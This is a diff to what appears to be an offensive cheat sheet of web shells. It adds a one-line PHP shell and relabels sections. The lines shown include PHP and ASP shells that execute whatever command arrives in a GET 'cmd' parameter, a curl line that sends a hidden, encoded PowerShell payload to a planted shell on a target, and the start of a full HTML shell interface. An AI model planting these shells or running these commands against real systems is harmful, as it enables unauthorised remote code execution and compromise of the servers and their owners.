@@ -189,9 +189,11 @@ unzip backup.zip -d .
 
 ## Web
 [*] Web Shell
-+---------- CMD Shells ----------+
++---------- Initial Shell ----------+
+<?=`$_GET[cmd]`?>
 curl -G 'http://$TARGET/0.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
 
++---------- Variations ----------+
 PHP
 <?=`$_GET[cmd]`?>
 <?php system($_GET['cmd']); ?>
@@ -207,7 +209,6 @@ Set s = CreateObject("WScript.Shell")
 Set c = s.Exec("cmd /c " & Request("cmd"))
 Response.Write c.StdOut.ReadAll() %>
 
-+---------- Full Shells ----------+
 <html>
 <body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
